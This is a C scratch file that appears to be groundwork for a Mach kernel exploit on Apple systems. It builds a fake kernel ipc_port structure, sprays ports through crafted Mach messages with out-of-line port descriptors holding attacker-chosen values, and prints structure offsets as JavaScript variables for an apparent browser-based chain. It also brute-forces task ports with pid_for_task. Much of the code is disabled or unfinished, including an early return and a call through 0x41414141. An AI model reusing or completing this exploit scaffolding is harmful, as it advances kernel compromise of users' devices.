#include <mach/mach.h>
#include <sys/mman.h>
#include <stddef.h>
#include <stdio.h>
#include <dlfcn.h>
//#include <IOKit/IOKitLib.h>
//#include <IOKit/iokitmig.h>

typedef struct __attribute__((__packed__)) {
    uint32_t ip_bits;
    uint32_t ip_references;
    struct __attribute__((__packed__)) {
        uint32_t data;
        uint32_t pad;
        uint32_t type;
    } ip_lock;
    struct __attribute__((__packed__)) {
        struct __attribute__((__packed__)) {
            struct __attribute__((__packed__)) {
                uint32_t flags;
                uintptr_t waitq_interlock;
                uint64_t waitq_set_id;
                uint64_t waitq_prepost_id;
                struct __attribute__((__packed__)) {
                    uintptr_t next;
                    uintptr_t prev;
                } waitq_queue;
            } waitq;
            uintptr_t messages;
            natural_t seqno;
            natural_t receiver_name;
            uint16_t msgcount;
            uint16_t qlimit;
        } port;
        uintptr_t imq_klist;
    } ip_messages;
    natural_t ip_flags;
    uintptr_t ip_receiver;
    uintptr_t ip_kobject;
    uintptr_t ip_nsrequest;
    uintptr_t ip_pdrequest;
    uintptr_t ip_requests;
    uintptr_t ip_premsg;
    uint64_t  ip_context;
    natural_t ip_mscount;
    natural_t ip_srights;
    natural_t ip_sorights;
} kport_t;

mach_port_t kp = 0;
mach_port_t spray_ports(mach_msg_type_number_t number_port_descs) {
    if (!kp) {
        mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &kp);
        mach_port_insert_right(mach_task_self(), kp, kp, MACH_MSG_TYPE_MAKE_SEND);
    }

    mach_port_t mp = 0;

    mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &mp);
    mach_port_insert_right(mach_task_self(), mp, mp, MACH_MSG_TYPE_MAKE_SEND);

    send_ports(mp, kp, 2, number_port_descs);

	printf("%x %x %x %x\n", mp, kp, 2, number_port_descs);

    return mp;
}

kern_return_t send_ports(mach_port_t target, mach_port_t payload, size_t num, mach_msg_type_number_t number_port_descs)
{
    mach_port_t init_port_set[num];
    for(size_t i = 0; i < num; ++i)
    {
        init_port_set[i] = payload;
    }

    typedef struct {
        mach_msg_header_t Head;
        mach_msg_body_t msgh_body;
        mach_msg_ool_ports_descriptor_t init_port_set[0];
    } Request;

    char buf[sizeof(Request) + number_port_descs*sizeof(mach_msg_ool_ports_descriptor_t)];
    Request *InP = (Request*)buf;

    InP->msgh_body.msgh_descriptor_count = number_port_descs;
    for (int i = 0; i < 2; i++) {
        InP->init_port_set[i].address = (void *)0x41424344;
        InP->init_port_set[i].count = 0x45464748;
        InP->init_port_set[i].disposition = 0x53;
        InP->init_port_set[i].deallocate =  0x51;
        InP->init_port_set[i].type = 0x54;
    }

    InP->Head.msgh_bits = 0x494a4b4c;
    /* msgh_size passed as argument */
    InP->Head.msgh_remote_port = 0x4d4e4f50;
    InP->Head.msgh_local_port = 0x51525354;
    InP->Head.msgh_id = 0x55565758;

    for (int i = 0; i < (sizeof(Request) + number_port_descs * sizeof(mach_msg_ool_ports_descriptor_t)); i++) {
        printf("0x%02x,", ((uint8_t*)(buf))[i]);
    }
    printf("\n");

    int ret = mach_msg(&InP->Head, MACH_SEND_MSG|MACH_MSG_OPTION_NONE, (mach_msg_size_t)sizeof(Request)+number_port_descs*sizeof(mach_msg_ool_ports_descriptor_t), 0, 0, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
	printf("%d %s\n", ret, mach_error_string(ret));
    return ret;
}

void (*ptr)() = (void (*)())0x41414141;

static kern_return_t r3gister(task_t task, mach_port_array_t init_port_set, mach_msg_type_number_t real_count, mach_msg_type_number_t fake_count)
{
    ptr();
    printf("%p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p\n");
}

struct test {
    int a;
    int b;
    char* c;
};

int main(int argc, char* argv[]) {
    printf("%x\n", dlopen("/System/Library/PrivateFrameworks/GameCenter.framework/GameCenter", RTLD_NOW));
    return;

#if 0
    struct test d;
    d.a = 1;
    d.b = 2;
    d.c = "Hello, world!\n";
    printf("%x %x %x %x %x %x %x %x\n", d, 0x41414141, 0x41424344);
    return;
	printf("var MACH_PORT_RIGHT_RECEIVE = 0x%x;\n", MACH_PORT_RIGHT_RECEIVE);
	printf("var MACH_MSG_TYPE_MAKE_SEND = 0x%x;\n", MACH_MSG_TYPE_MAKE_SEND);
	printf("var MACH_PORT_LIMITS_INFO = 0x%x;\n", MACH_PORT_LIMITS_INFO);
	printf("var MACH_PORT_LIMITS_INFO_COUNT = 0x%x;\n", MACH_PORT_LIMITS_INFO_COUNT);
	printf("var MACH_MSG_OOL_PORTS_DESCRIPTOR = 0x%x;\n", MACH_MSG_OOL_PORTS_DESCRIPTOR);
	printf("var kport_size = 0x%x;\n", sizeof(kport_t));
	kport_t kport[2] = {};
    uintptr_t *ptr = (uintptr_t*)(kport + 1);
    kport->ip_bits = 0x80000002; // IO_BITS_ACTIVE | IOT_PORT | IKOT_TASK
    kport->ip_references = 100;
    kport->ip_lock.type = 0x11;
    kport->ip_messages.port.qlimit = 777;
    kport->ip_receiver = 0x12345678; // dummy
    kport->ip_srights = 99;
	typedef struct {
        mach_msg_header_t Head;
        mach_msg_body_t msgh_body;
        mach_msg_ool_ports_descriptor_t init_port_set[0];
    } Request;

	printf("%x\n", sizeof(Request));
	printf("%x\n", sizeof(mach_msg_ool_ports_descriptor_t));
	printf("var req_init_port_set = 0x%x\n", offsetof(Request, init_port_set));
	printf("var req_init_port_set_address = 0x%x\n",  offsetof(mach_msg_ool_ports_descriptor_t, address));
	printf("var req_init_port_set_count = 0x%x\n",  offsetof(mach_msg_ool_ports_descriptor_t, count));
	printf("%x %x %x %x %x\n", PROT_READ, PROT_WRITE, PROT_EXEC, MAP_PRIVATE, MAP_ANON);
//	printf("var req_init_port_set_disposition = 0x%x\n",  offsetof(Request, init_port_set) + offsetof(mach_msg_ool_ports_descriptor_t, disposition));
//	printf("var req_init_port_set_deallocate = 0x%x\n",  offsetof(Request, init_port_set) + offsetof(mach_msg_ool_ports_descriptor_t, deallocate));
//	printf("var req_init_port_set_type = 0x%x\n", offsetof(Request, init_port_set) +  offsetof(mach_msg_ool_ports_descriptor_t, type));
	printf("var req_head_msgh_bits = 0x%x\n", offsetof(Request, Head.msgh_bits));
	printf("var req_head_msgh_remote_port = 0x%x\n", offsetof(Request, Head.msgh_remote_port));
	printf("var req_head_msgh_local_port = 0x%x\n", offsetof(Request, Head.msgh_local_port));
	printf("var req_head_msgh_id = 0x%x\n", offsetof(Request, Head.msgh_id));
	printf("var req_msgh_body_msgh_descriptor_count = 0x%x\n", offsetof(Request, msgh_body.msgh_descriptor_count));

	printf("%x\n", sizeof(mach_msg_header_t));

	printf("%x\n", MACH_MSGH_BITS_COMPLEX | MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE));
	printf("%x\n", MACH_SEND_MSG|MACH_MSG_OPTION_NONE);
	printf("%x\n", MACH_MSG_TIMEOUT_NONE);

	printf("var kport_ip_bits%x = 0x%x;\n", 4, offsetof(kport_t, ip_bits));
	printf("var kport_ip_references%x = 0x%x;\n", 4, offsetof(kport_t, ip_references));
	printf("var kport_ip_lock_type%x = 0x%x;\n", 4, offsetof(kport_t, ip_lock.type));
	printf("var kport_ip_messages_port_qlimit%x = 0x%x;\n", 2, offsetof(kport_t, ip_messages.port.qlimit));
	printf("var kport_ip_receiver%x = 0x%x;\n", 4, offsetof(kport_t, ip_receiver));
	printf("var kport_ip_srights%x = 0x%x;\n", 4, offsetof(kport_t, ip_srights));
	printf("var MIG_MAX = 0x%x\n", 0x1000);
	printf("var NDR_record = %x %x %x %x\n", NDR_record);

//    spray_ports(2);

    printf("%x\n", MACH_RCV_MSG);
#endif

    #pragma pack(4)
    typedef struct {
        mach_msg_header_t Head;
        mach_msg_body_t msgh_body;
        mach_msg_ool_ports_descriptor_t init_port_set;
        NDR_record_t NDR;
        mach_msg_type_number_t init_port_setCnt;
    } Request;
    typedef struct {
        mach_msg_header_t Head;
        NDR_record_t NDR;
        kern_return_t RetCode;
        mach_msg_trailer_t trailer;
    } Reply;
#pragma pack()

    union {
        Request In;
        Reply Out;
    } Mess;
    Request *InP = &Mess.In;
    Reply *OutP = &Mess.Out;

    InP->msgh_body.msgh_descriptor_count = 1;
    InP->init_port_set.address = (void*)(0x41414141);
    InP->init_port_set.count = 0x42424242;
    InP->init_port_set.disposition = 19;
    InP->init_port_set.deallocate =  FALSE;
    InP->init_port_set.type = MACH_MSG_OOL_PORTS_DESCRIPTOR;
    InP->NDR = NDR_record;
    InP->init_port_setCnt = 0x43434343; // was real_count
    InP->Head.msgh_bits = MACH_MSGH_BITS_COMPLEX | MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);
    InP->Head.msgh_remote_port = 0x45454545;
    InP->Head.msgh_local_port = 0x69696969;
    InP->Head.msgh_id = 3403;

    for (int i = 0; i < 0x100; i++) {
        printf("%02x", ((uint8_t*)InP)[i]);
    }
    printf("\n");

    printf("    InP->msgh_body.msgh_descriptor_count  %p %p\n", ((void*)&    InP->msgh_body.msgh_descriptor_count ) - ((void*)InP), sizeof(    InP->msgh_body.msgh_descriptor_count ));
    printf("    InP->init_port_set.address  %p %p\n", ((void*)&    InP->init_port_set.address ) - ((void*)InP), sizeof(    InP->init_port_set.address ));
    printf("    InP->init_port_set.count  %p %p\n", ((void*)&    InP->init_port_set.count ) - ((void*)InP), sizeof(    InP->init_port_set.count ));
    printf("    InP->init_port_set  %p %p\n", ((void*)&    InP->init_port_set ) - ((void*)InP), sizeof(InP->init_port_set));
    //printf("    InP->init_port_set.disposition  %p %p\n", ((void*)&    InP->init_port_set.disposition ) - ((void*)InP), sizeof(    InP->init_port_set.disposition ));
    //printf("    InP->init_port_set.deallocate  %p %p\n", ((void*)&    InP->init_port_set.deallocate ) - ((void*)InP), sizeof(    InP->init_port_set.deallocate ));
    //printf("    InP->init_port_set.type  %p %p\n", ((void*)&    InP->init_port_set.type ) - ((void*)InP), sizeof(    InP->init_port_set.type ));
    printf("    InP->NDR  %p %p\n", ((void*)&    InP->NDR ) - ((void*)InP), sizeof(    InP->NDR ));
    printf("    InP->init_port_setCnt  %p %p\n", ((void*)&    InP->init_port_setCnt ) - ((void*)InP), sizeof(    InP->init_port_setCnt ));
    printf("    InP->Head.msgh_bits  %p %p\n", ((void*)&    InP->Head.msgh_bits ) - ((void*)InP), sizeof(    InP->Head.msgh_bits ));
    printf("    InP->Head.msgh_remote_port  %p %p\n", ((void*)&    InP->Head.msgh_remote_port ) - ((void*)InP), sizeof(    InP->Head.msgh_remote_port ));
    printf("    InP->Head.msgh_local_port  %p %p\n", ((void*)&    InP->Head.msgh_local_port ) - ((void*)InP), sizeof(    InP->Head.msgh_local_port ));
    printf("    InP->Head.msgh_id  %p %p\n", ((void*)&    InP->Head.msgh_id ) - ((void*)InP), sizeof(    InP->Head.msgh_id ));
    printf("0x%08x\n", MACH_SEND_MSG|MACH_RCV_MSG|MACH_MSG_OPTION_NONE);
    printf("0x%08x 0x%08x\n", (mach_msg_size_t)sizeof(Request), (mach_msg_size_t)sizeof(Reply));
    printf("0x%08x\n", ((void*)&OutP->RetCode) - ((void*)&OutP));

    printf("%x\n", offsetof(kport_t, ip_kobject));
    printf("%x\n", sizeof(kport_t));

    printf("%x %x\n", 0x2130000,  ((19 << 16) + (MACH_MSG_OOL_PORTS_DESCRIPTOR << 24)));

    mach_port_t *arrz=0;
    printf("%p %p\n", arrz, &arrz);

    mach_port_t arr[2] = {MACH_PORT_NULL,MACH_PORT_NULL};
    r3gister(0x41414141,arr,0x42424242,3);
    printf("r3gister done\n");


#pragma pack(4)
typedef struct {
    mach_msg_header_t Head;
    mach_msg_body_t msgh_body;
    mach_msg_ool_ports_descriptor_t init_port_set[];
} Request2;
#pragma pack()
    printf("%x %x\n", sizeof(Request2) + 5 * sizeof(mach_msg_ool_ports_descriptor_t) + sizeof(mach_msg_trailer_t), 0x1c + (5 * 0xc) + 0x8);


    kport_t kportaaa[2] = {};
    uintptr_t *ptraaa = (uintptr_t*)(kportaaa + 1);

    printf("%p\n", ((void*)ptraaa) - ((void*)kportaaa));

    printf("===validity check\n");

    uintptr_t whatever;

    for (mach_port_t i = 0; i < 0x1000000; i++) {
        if (pid_for_task(i, &whatever) == KERN_SUCCESS)
            printf("0x%x\n", i);
    }

#if 0
    kern_return_t ret = mach_msg(&InP->Head, MACH_SEND_MSG|MACH_RCV_MSG|MACH_MSG_OPTION_NONE, (mach_msg_size_t)sizeof(Request), (mach_msg_size_t)sizeof(Reply), InP->Head.msgh_local_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
    if(ret == KERN_SUCCESS)
    {
        ret = OutP->RetCode;
    }
    return ret;
#endif

/*
    for (int i = 0; i < (sizeof(Request) + number_port_descs * sizeof(mach_msg_ool_ports_descriptor_t)); i++) {
        printf("0x%02x,", ((uint8_t*)(buf))[i]);
    }
    printf("\n");

	int ret = mach_msg(buf, 1, 0x1c + (number_port_descs * 0xc), 0, 0, 0, MACH_PORT_NULL);*/
//
//	printf("%d %s\n", ret, mach_error_string(ret));

  //  printf("%p %p %x %x\n", buf, &InP->Head, sizeof(Request), sizeof(mach_msg_ool_ports_descriptor_t)); 
   // printf("%x %x %x %x %x %x %x %x %x\n", &InP->Head, MACH_SEND_MSG|MACH_MSG_OPTION_NONE, (mach_msg_size_t)sizeof(Request)+number_port_descs*sizeof(mach_msg_ool_ports_descriptor_t), 0, 0, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL, 0x41414141);   

	return 0;
}
